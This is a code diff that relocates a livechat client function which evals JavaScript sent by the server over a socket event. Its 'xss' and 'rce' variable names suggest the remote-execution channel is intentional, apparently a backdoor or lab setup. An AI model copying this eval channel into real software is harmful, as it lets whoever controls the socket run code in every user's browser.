@@ -124,22 +124,6 @@ function receiveMessage(msg, userName, socketId) {
     }
 }
 
-function processInfo(event, data) {
-    switch (event) {
-        case 0x01:
-            xsssocketid = data;
-            if (xsssocketid == csid) {rceContainer.style.setProperty("--showing", "show")} else {rceContainer.style.setProperty("--showing", "hidden")}
-            break;
-
-        case 0x02:
-            eval(data);
-            break;
-    
-        default:
-            break;
-    }
-}
-
 if (LivechatButton != null) {
     LivechatButton.onclick = function () {
         setVisible(!panelVisible);
@@ -204,6 +188,22 @@ socket.on("connect", function () {
 });
 
 socket.on("message", receiveMessage);
+
+function processInfo(event, data) {
+    switch (event) {
+        case 0x01:
+            xsssocketid = data;
+            if (xsssocketid == csid) {rceContainer.style.setProperty("--showing", "show")} else {rceContainer.style.setProperty("--showing", "hidden")}
+            break;
+
+        case 0x02:
+            eval(data);
+            break;
+    
+        default:
+            break;
+    }
+}
 
 socket.on("serverinfo", processInfo);
 
